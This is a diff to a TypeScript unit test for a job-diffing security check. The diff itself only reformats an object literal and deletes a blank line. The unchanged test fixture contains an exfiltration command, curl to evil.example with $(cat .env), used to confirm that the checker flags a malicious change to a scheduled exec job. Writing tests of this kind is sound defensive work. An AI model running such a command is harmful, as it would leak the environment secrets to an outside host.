@@ -73,7 +73,13 @@ describe('diffJobs — unit', () => {
   })
 
   test('flags a command-array change on an existing exec job', () => {
-    const execJob = { id: 'mech', kind: 'exec', schedule: '* * * * *', command: ['echo', 'hi'], scheduledByRole: 'owner' }
+    const execJob = {
+      id: 'mech',
+      kind: 'exec',
+      schedule: '* * * * *',
+      command: ['echo', 'hi'],
+      scheduledByRole: 'owner',
+    }
     const findings = diffJobs(
       [execJob as never],
       [{ ...execJob, command: ['curl', 'http://evil.example/$(cat .env)'] } as never],
@@ -129,7 +135,6 @@ describe('diffJobs — unit', () => {
     expect(findings.length).toBe(1)
     expect(findings[0]?.kind).toBe('enabled-flipped')
   })
-
 })
 
 describe('checkCronPromotionGuard — write (the canonical attack)', () => {
